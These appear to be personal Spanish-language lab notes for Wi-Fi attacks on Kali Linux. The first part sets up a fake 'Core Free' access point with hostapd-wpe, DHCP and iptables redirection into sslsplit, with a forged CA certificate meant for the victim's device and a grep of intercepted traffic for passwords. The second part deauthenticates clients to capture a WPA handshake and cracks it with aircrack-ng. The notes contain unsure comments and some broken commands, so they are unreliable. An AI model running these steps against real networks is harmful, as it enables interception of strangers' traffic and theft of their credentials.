# Titulo
## Teclado ES permanente en Kali

Abrir la aplicación "Session and Startup". Ir a la pestaña "Application Autostart" y al botón "+". 
```
Name: Teclado ES
Description:
Command: setxkbmap es sundeadkeys
Trigger: on login
```

## AP (punto de acceso)

Comprobar que el dispositivo está enchufado y detectado.
```
iwconfig
```

Actualizar la lista de paquetes disponibles y sus versiones
```
sudo apt update && upgrade
```

Se modifica el `Hhostapd` para facilitar ataques de impersonificación en puntos de acceso.

Se instala el paquete hostapd-wpe.
```
sudo apt install hostapd-wpe
```

Se crea la carpeta `pruebas`.
```
cd
mkdir pruebas
cd pruebas
```

Se crea el archivo `host.conf`.
```
nano host.conf
```

Se añade las siguientes instruciones:
```
interface=wlan0
driver=nl80211
country_code=ES
hw_mode=g
channel=1
ssid=Core Free

#auth_algs=1
#wpa=2
#wpa_key_mgmt=WPA-PSK
#wpa_pairwise=CCMP
#wpa_passphrase=12345678
```

## Redirección de tráfico

Ir a la carpeta.
```
cd
cd pruebas
```

Crear el fichero ìp.sh`.
```
touch ip.sh
chmod 700 ip.sh
nano ip.sh
```

Añadir las siguientes instrucciones.
```
#!/bin/bash

iptables-legacy -F
iptables-legacy -t nat -F

iptables-legacy -X
iptables-legacy -t nat -X

iptables-legacy -P INPUT ACCEPT
iptables-legacy -P OUTPUT ACCEPT
iptables-legacy -P FORWARD ACCEPT

echo 1 > /proc/sys/net/ipv4/ip_forward

LAN_IF="eth0"

iptables-legacy -t nat -A POSTROUTING -o $LAN_IF -j MASQUERADE
```

## DHCP
Instalar el paquete `isc-dhcp-server`para crear un servidor dhcp.
```
sudo apt install isc-dhcp-server
sudo cp /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.ORIGINAL
sudo nano /etc/dhcp/dhcpd.conf
```

Descomentar la siguiente instruccion.
```
#authoritative;
```

Añadir al final del documento.
```
subnet 172.16.0.0 netmask 255.255.255.0 {
    range 172.16.0.100 172.16.0.240;
    option broadcast-address 172.16.0.255;
    option routers 172.16.0.1;
    option domain-name "local";
    option domain-name-servers 8.8.8.8, 8.8.4.4;
}
```

Abrir el siguiente archivo.
```
sudo nano /etc/default/isc-dhcp-server
```

Modificarlo de la siguiente forma.
```
INTERFACESV4="wlan0"
# INTERFACESV6=""
```

## Iniciar

Nota: Correr en el mismo orden en caso de reiniciar el sistema
```
sudo ifconfig wlan0 172.16.0.1 netmask 255.255.255.0
sudo systemctl start isc-dhcp-server.service
sudo systemctl status isc-dhcp-server.service
```

Ir nuevamente a la carpeta.
```
cd
cd pruebas
```

Ejecutar nuevamente el script.
```
sudo ./ip.sh
```

Ejecutar los siguientes comandos:
```
sudo airmon-ng check
sudo airmon-ng check kill
sudo airmon-ng check
```

*AQUI NO SE LO QUE HACE.*
```
sudo hostapd-wpe host.conf
```

## SSL

Vamos nuevamente a la carpeta y creamos otra.
```
cd
cd pruebas
mkdir sslsplit
cd sslsplit
```

Generar el certificado. `Debe ser instalado en el dispositivo de la víctima`.
```
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 1826 -key ca.key -out ca.crt
```

Editar el script "ip.sh" que teníamos y añadir debajo lo siguiente
```
iptables-legacy -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
iptables-legacy -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
iptables-legacy -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443
iptables-legacy -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443
iptables-legacy -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443
iptables-legacy -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080
iptables-legacy -t nat -F
```

Volver a lanzar
```
sudo ./ip.sh
```
Creamos la carpeta logdir dentro de `sslsplit`.
```
cd
cd pruebas/sslsplit
mkdir logdir
```

## Iniciar SSL

Creamos el directorio.
```
mkdir /tmp/sslsplit
````
```
cd
cd pruebas/sslsplit
```
Ejecutamos en otra consola este comando:
```
sudo sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt https 0.0.0.0 8443 tcp 0.0.0.0 8080
```
Y en otra terminal:
```
cd
cd pruebas/sslsplit
tail -f connections.log
```
*BUSCAMOS LA PASS?? MEDIANTE EL FILTRO??*
```
cd
cd pruebas/sslsplit/logdir
ls -la
grep -r 'pass' ./
```


## Certificado
Ruta para descargarse el certificado.
```
http://luisangel2.es/ca.crt
o
https://github.com/luisesp19/ap/raw/main/ca.zip
```
# Fuerza bruta de una red wifi

Crear un "wordlist" de contraseñas
```
cd
cd Desktop
nano contrasenas.txt
```
Agregamos algunas palabras/contraseñas.
```
hola
prueba
perro
gato
core
casa
```

Comprobar que el dispositivo ha sido detectado.
```
iwconfig
```
Ejecutamos los comandos siguientes:
```
sudo airmon-ng check
sudo airmon-ng check kill
sudo airmon-ng check
```


Poner el dispositivo en modo monitor y comprobar que ha cambiado de nombre a "wlan0mon".

```
sudo airmon-ng start wlan1
iwconfig
```

Escanear las redes públicas para obtener el BSSID del punto de acceso y su canal.
```
sudo airodump-ng wlan1mon
```


Volver a correr el comando, esta vez especificando ambos y un nombre para el output (archivos de salida) que nos servirán más adelante.

IMPORTANTE: Los comandos a continuación es necesario ejecutarlos desde el mismo directorio que en este caso será "Desktop".

```
cd
cd Desktop
sudo airodump-ng -c [canal] --bssid [bssid] -w objetivo wlan1mon
```

En la parte inferior se muestran los dispositivos conectados al punto de acceso.

En otra pestaña del terminal, vamos a desautenticar alguno de los dispositivos legítimos lanzando "tramas de desautenticación". Usar la columna STATION del elegido y nuevamente el BSSID del punto de acceso.

```
cd
cd Desktop
sudo aireplay-ng -0 5 -a [bssid] -c [station] wlan1mon
```

La desautenticación del dispositivo es imperceptible y el mismo se reconectará automáticamente de forma inmediata pero habremos conseguido el deseado "4-Way Handshake". Comprobarlo en la otra pestaña del terminal "WPA handshake".

Lanzar la fuerza bruta usando el "wordlist" de contraseñas y el ".cap" de los archivos de salida. Si la contraseña está en el wordlist se mostrará "KEY FOUND".
```
cd
cd Desktop
sudo aircrack-ng -w [contrasenas] [cap]
```

## Links

- [Guía de heckel.io](https://blog.heckel.io/2013/08/04/use-sslsplit-to-transparently-sniff-tls-ssl-connections/)

## Otros
- [Attack.com](https://alpaca-attack.com/)

- [Descrifrar trafico ssl](https://protegermipc.net/2020/05/27/descifrar-trafico-ssl-con-wireshark/)

